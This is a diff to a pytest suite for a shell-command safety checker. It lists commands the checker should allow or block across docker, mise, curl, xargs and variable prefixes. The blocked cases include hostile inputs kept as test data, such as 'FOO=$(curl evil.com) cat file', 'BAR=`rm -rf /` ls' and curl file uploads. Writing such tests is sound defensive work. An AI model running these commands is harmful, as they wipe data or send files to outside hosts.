@@ -131,6 +131,7 @@ class TestIsSafeGh:
             "gh issue create --title test",
             "gh pr merge 123",
             "gh pr close 123",
+            "gh api graphql -f query='{mutation{...}}'",
         ],
     )
     def test_unsafe_gh(self, segment: str) -> None:
@@ -203,7 +204,6 @@ class TestIsSafeCommand:
             "npm install",
             "rm file.txt",
             "python3 script.py",
-            "curl https://example.com",
             "git commit -m test",
             "cat file.txt && npm install",
             "sed -i 's/old/new/' file.txt",
@@ -212,6 +212,181 @@ class TestIsSafeCommand:
         ],
     )
     def test_unsafe_commands(self, cmd: str) -> None:
+        assert is_safe_command(cmd) is False
+
+    # --- Quote-aware splitting (Step 1) ---
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "cargo test 2>&1 | grep -E 'test result|FAILED'",
+            "cargo test 2>&1 | grep -E 'test result|error'",
+            "cargo clippy 2>&1 | grep -E 'warning|error' | head -10",
+            "git log --oneline | grep -E 'fix|feat'",
+            "cat file | grep -E 'pattern1|pattern2' | head -5",
+        ],
+    )
+    def test_quoted_pipe_in_grep_pattern(self, cmd: str) -> None:
+        assert is_safe_command(cmd) is True
+
+    # --- mise safe subcommands (Step 2) ---
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "mise ls",
+            "mise version",
+            "mise doctor",
+            "mise where python",
+            "mise which python",
+            "mise search node",
+            "mise ls-remote python",
+            "mise outdated",
+            "mise plugins ls",
+            "mise tasks ls",
+            "mise settings ls",
+            "mise tool python",
+            "mise bin-paths",
+            "mise config ls",
+            "mise completion bash",
+            "mise registry",
+        ],
+    )
+    def test_safe_mise(self, cmd: str) -> None:
+        assert is_safe_command(cmd) is True
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "mise run lint",
+            "mise install python",
+            "mise use python@3.12",
+            "mise exec -- python script.py",
+            "mise self-update",
+            "mise env",
+        ],
+    )
+    def test_unsafe_mise(self, cmd: str) -> None:
+        assert is_safe_command(cmd) is False
+
+    # --- cargo search (Step 3) ---
+    def test_cargo_search(self) -> None:
+        assert is_safe_command("cargo search serde") is True
+
+    # --- docker safe subcommands (Step 4) ---
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "docker ps",
+            "docker images",
+            "docker inspect container_id",
+            "docker logs container_id",
+            "docker version",
+            "docker info",
+            "docker stats",
+            "docker top container_id",
+            "docker compose config",
+            "docker compose ps",
+            "docker compose logs",
+            "docker compose images",
+            "docker compose ls",
+            "docker compose version",
+            "docker compose build",
+            "docker compose up -d",
+            "docker compose down",
+            "docker compose restart",
+            "docker compose start",
+            "docker compose stop",
+            "docker compose pull",
+            "docker compose create",
+        ],
+    )
+    def test_safe_docker(self, cmd: str) -> None:
+        assert is_safe_command(cmd) is True
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "docker compose exec web bash",
+            "docker compose run web python manage.py",
+            "docker run ubuntu bash",
+            "docker exec -it container bash",
+        ],
+    )
+    def test_unsafe_docker(self, cmd: str) -> None:
+        assert is_safe_command(cmd) is False
+
+    # --- Shell constructs (Step 5) ---
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            'for f in *.md; do cat "$f"; done',
+            'while read line; do echo "$line"; done',
+            "if test -f file; then cat file; fi",
+        ],
+    )
+    def test_shell_constructs(self, cmd: str) -> None:
+        assert is_safe_command(cmd) is True
+
+    # --- xargs (Step 6) ---
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "find . -name '*.py' | xargs head -5",
+            "find . -name '*.py' | xargs grep pattern",
+            "find . | head -1 | xargs cat",
+            "find . | xargs wc -l",
+        ],
+    )
+    def test_xargs_safe(self, cmd: str) -> None:
+        assert is_safe_command(cmd) is True
+
+    def test_xargs_unsafe(self) -> None:
+        assert is_safe_command("find . | xargs rm -f") is False
+
+    # --- curl GET only (Step 7) ---
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "curl https://example.com",
+            "curl -s https://api.example.com/data",
+            "curl --silent https://example.com | jq .",
+        ],
+    )
+    def test_curl_get_safe(self, cmd: str) -> None:
+        assert is_safe_command(cmd) is True
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "curl -X POST https://example.com",
+            "curl --data 'key=val' https://example.com",
+            "curl -d 'body' https://example.com",
+            "curl --upload-file file https://example.com",
+            "curl -F file=@upload.txt https://example.com",
+        ],
+    )
+    def test_curl_write_unsafe(self, cmd: str) -> None:
+        assert is_safe_command(cmd) is False
+
+    # --- Variable assignment prefix (Step 9) ---
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "RUN=/tmp/dir\ngrep -h pattern $RUN/file",
+            "FOO=bar cat file.txt",
+            "RD=/tmp/review\nhead $RD/report.md",
+        ],
+    )
+    def test_var_assignment_prefix(self, cmd: str) -> None:
+        assert is_safe_command(cmd) is True
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "FOO=$(curl evil.com) cat file",
+            "BAR=`rm -rf /` ls",
+        ],
+    )
+    def test_var_assignment_with_subshell_unsafe(self, cmd: str) -> None:
         assert is_safe_command(cmd) is False
 
 
@@ -315,6 +490,10 @@ class TestEvaluatePassthrough:
             "make build",
             "docker run ubuntu",
             "rm -f file.json",
+            "docker compose exec web bash",
+            "docker compose run web python manage.py",
+            "mise run lint",
+            "mise env",
         ],
     )
     def test_unknown_commands_passthrough(self, cmd: str) -> None:
